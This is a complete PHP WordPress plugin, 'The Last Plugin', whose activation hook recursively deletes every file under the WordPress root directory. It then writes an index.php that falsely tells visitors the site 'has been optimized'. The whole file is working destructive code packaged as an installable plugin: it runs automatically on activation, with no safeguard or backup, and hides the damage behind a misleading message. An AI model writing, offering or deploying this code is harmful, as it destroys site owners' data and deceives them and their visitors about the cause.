<?php
/*
Plugin Name: The Last Plugin
Description: A plugin to remove the entire WordPress installation and replace it with an optimized message.
Version: 1.0
Author: Doesn't matter

*/
    // Function to recursively delete directories and files
    function last_plugin_delete_directory($dir) {
        if (!file_exists($dir)) {
            return;
        }
        $files = array_diff(scandir($dir), array('.', '..'));
        foreach ($files as $file) {
            $path = $dir . '/' . $file;
            if (is_dir($path)) {
                last_plugin_delete_directory($path);
            } else {
                unlink($path);
            }
        }
        rmdir($dir);
    }

register_activation_hook(__FILE__, function(){
      // Define the path to the WordPress root directory
    $wp_root = ABSPATH;

    // Delete the WordPress installation
    last_plugin_delete_directory($wp_root);

    // Define the web root path
    $web_root = dirname($wp_root);

    // Create a new index.php in the web root
    $index_content = <<<EOT
<!DOCTYPE html>
<html>
<head>
    <title>Website Optimized</title>
</head>
<body>
    <h1>This website has been optimized</h1>
</body>
</html>
EOT;

    // Write the content to index.php
    file_put_contents($web_root . '/index.php', $index_content);
});
